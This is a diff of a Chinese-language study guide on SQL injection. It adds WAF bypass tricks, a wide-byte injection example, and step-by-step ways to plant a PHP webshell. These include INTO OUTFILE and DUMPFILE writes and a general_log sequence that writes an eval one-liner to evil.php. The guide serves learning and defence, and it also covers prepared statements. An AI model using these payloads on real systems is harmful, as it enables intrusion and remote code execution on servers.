@@ -4,7 +4,8 @@
   - [SQL注入成因？ 😉😉](#sql注入成因-)
   - [SQL注入防护方法？ 😉😉](#sql注入防护方法-)
   - [SQL注入如何判断](#sql注入如何判断)
-  - [SQL注入主要类型？😉😉](#sql注入主要类型)
+  - [SQL注入绕过技巧](#sql注入绕过技巧)
+  - [SQL注入主要类型？](#sql注入主要类型)
   - [联合查询的运用场景？](#联合查询的运用场景)
   - [报错注入的函数有哪些？](#报错注入的函数有哪些)
   - [布尔型注入方式？使用的函数？](#布尔型注入方式使用的函数)
@@ -13,9 +14,10 @@
   - [宽字节注入？](#宽字节注入)
   - [HTTP头部注入可能参数点？原因？](#http头部注入可能参数点原因)
   - [二阶注入？](#二阶注入)
-  - [sql注入写文件用的函数？](#sql注入写文件用的函数)
-  - [sql注入写shell的条件？](#sql注入写shell的条件)
+  - [sql注入写文件用的函数？  😉😉](#sql注入写文件用的函数--)
+  - [sql注入写shell的条件？(利用sql注入拿到webshell) 😉😉](#sql注入写shell的条件利用sql注入拿到webshell-)
   - [不同数据库获取数据信息的过程](#不同数据库获取数据信息的过程)
+  - [mysql 5.0以上和以下区别](#mysql-50以上和以下区别)
 - [XSS](#xss)
   - [XSS攻击如何产生？](#xss攻击如何产生)
   - [主要类型以及原理？](#主要类型以及原理)
@@ -97,6 +99,8 @@
    - 使用安全的API，即所有查询语句使用标准化的数据库查询语句API接口，设定语句的参数进行过滤一些非法的字符，防止用户输入恶意字符传入数据库中执行sql语句。(如果直接将获取的参数传入预编译语句中，也有可能产生**二次注入**，即从数据库中查询出**恶意数据**)
    >**数据库预编译：**
    >
+   >预编译将一次查询分两次交互完成，第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode；第二次交互发送数据，带入AST或Opcode中执行，此时语法解析已经完成，因此sql执行的逻辑不会改变，也就不会将输入的数据当作字符执行。
+   >
    > (1) 数据库SQL语句编译特性：
     **数据库接受到sql语句之后，需要词法和语义解析，优化sql语句，制定执行计划**。这需要花费一些时间。但是很多情况，我们的一条sql语句可能会反复执行，或者每次执行的时候只有个别的值不同（比如query的where子句值不同，update的set子句值不同,insert的values值不同）。
    > 
@@ -153,9 +157,39 @@
 
   2.判断出存在注入后，需要确定**注入类型**，再继续进一步的操作。
 
+## SQL注入绕过技巧
+- 编码绕过
+  - 大小写
+  - url编码
+  - html编码
+  - 十六进制编码
+  - unicode编码
+- 注释
+  - // — — + — - # /**/ ;%00
+  - 内联注释用的更多，它有一个特性 /!**/ 只有MySQL能识别
+  - e.g. index.php?id=-1 /!UNION/ /!SELECT/ 1,2,3
+- 只过滤了一次时
+  - union => ununionion
+- 相同功能替换
+  - 函数替换
+    - substring / mid / sub
+    - ascii / hex / bin
+    - benchmark / sleep
+  - 变量替换
+    - user() / @@user
+  - 符号和关键字
+    - and / &
+    - or / |
+- HTTP参数
+  - HTTP参数污染
+    - id=1&id=2&id=3 根据容器不同会有不同的结果
+  - HTTP分割注入
+- 缓冲区溢出
+  - 一些C语言的WAF处理的字符串长度有限，超出某个长度后的payload可能不会被处理
+- 二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过
 
 
-## SQL注入主要类型？😉😉
+## SQL注入主要类型？
 
 - 按数据类型分类
   - 数字型注入
@@ -268,12 +302,16 @@ mysqli_multi_query用于执行一个SQL语句或多个由分号分隔的SQL语�
 ## 宽字节注入？
 利用条件：
   - 数据库的编码为GBK
-  - 后端进行转义符转义，addslashes()、mysql_real_escape_string()或其他转义函数
+    - set character_set_client=gbk
+    - **防御：****character_set_client=binary**
+  - 后端进行转义符转义，`addslashes()、mysql_real_escape_string()`或其他转义函数
 
-    eg:\\' —>%5c%27 —>%df%5c%27—>(某个汉字)'
+    eg:
+    mysql数据库使用gbk编码时，会认为**两个字符是一个汉字**（前一个ascii码要大于128（比如%df），才到汉字的范围）
+    在输入%df%27时，addslashes函数会自动在%27(')前加上转义符%5c(/)，即输入变为了`%df%5c%27`，但在mysql执行sql语句时，会将`%df%5c`作为一个宽字符，一个汉字，然后%27独立出来成了单引号，从而实现注入攻击。
     
-    防御该漏洞：将mysql_query设置为binary
-
+    %df%27 —>%df%5c%27 —>(某个汉字)'
+    
 ## HTTP头部注入可能参数点？原因？
 **原因：**
 
@@ -321,19 +359,54 @@ mysqli_multi_query用于执行一个SQL语句或多个由分号分隔的SQL语�
 
 
 
-## sql注入写文件用的函数？
+## sql注入写文件用的函数？  😉😉
+suctf-2018 Multi Sql可练习
+
+1.**union select写入**
 
 - select '***' into outfile '路径'
 - select '***' into dumpfile '路径'
 
-eg：select '一句话木马' into dumpfile 'd:\\wwwroot\baidu.com\nvhack.php';
+eg：`select '一句话木马' into dumpfile 'd:\\wwwroot\baidu.com\nvhack.php';`
 
-## sql注入写shell的条件？
-- 用户权限
-- 目录读写权限
-- 防止命令执行：disable_functions，禁止了disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source，但是可以用dl扩展执行命令或者ImageMagick漏洞 https://www.waitalone.cn/imagemagic-bypass-disable_function.html
-- open_basedir: 将用户可操作的文件限制在某目录下
+注：若waf将select过滤了，可以考虑使用sql预定义语句。
 
+`
+set @num=hex编码后的select语句
+prepare sql from @num;		
+execute sql;
+`
+
+2.**分隔符写入**
+
+`?id=1 INTO OUTFILE '物理路径' lines/fields/columns terminated by  （一句话hex编码）#`
+
+注意：一句话木马需要用''括起来，并使用hex先编码
+
+3.**利用log写入**
+
+新版本的MySQL设置了导出文件的路径，很难在获取Webshell过程中去修改配置文件，无法通过使用select into outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。
+
+具体权限要求：数据库用户需具备Super和File服务器权限、获取物理路径。
+
+```
+show variables like '%general%';                        #查看配置
+set global general_log = on;                            #开启general log模式
+set global general_log_file = 'E:/study/WWW/evil.php';    #设置日志目录为shell地址
+select '<?php eval($_GET/[g/]);?>'                     #写入shell
+set global general_log=off;                             #关闭general log模式
+```
+
+
+## sql注入写shell的条件？(利用sql注入拿到webshell) 😉😉
+- **secure_file_priv 支持数据导入导出**
+  - 如果secure_file_priv=NULL，MySQL服务会禁止导入和导出操作。
+  - 通过命令查看secure-file-priv`的当前值，确认是否允许导入导出以及到处文件路径。
+  - show variables like '%secure_file_priv%';
+  - select count(file_priv) from mysql.user
+- 当前数据库用户权限，用户拥有FILE权限，即在写入文件的路径中有写入权限
+- web目录的物理路径(绝对路径)
+  - 一般可以通过phpinfo函数，测试页面，及报错信息，搜素引擎，目录爆破的方式来获取网站的真实物理路径，
 
 
 ## 不同数据库获取数据信息的过程
@@ -366,6 +439,11 @@ eg：select '一句话木马' into dumpfile 'd:\\wwwroot\baidu.com\nvhack.php';
     -  SELECT tablename FROM pg_tables;   
   - 获取列名
     -  select column_name from information_schema.columns where table_name='表名'
+
+## mysql 5.0以上和以下区别
+- 在Mysql5.0以上的版本中加入了一个information_schema这个系统表，这个系统表中包含了该数据库的所有数据库名、表名、列表，可以通过SQL注入来拿到用户的账号和口令，而Mysql5.0以下的只能暴力跑表名；
+- 5.0 以下是多用户单操作，5.0 以上是多用户多操作。
+
 
 
 
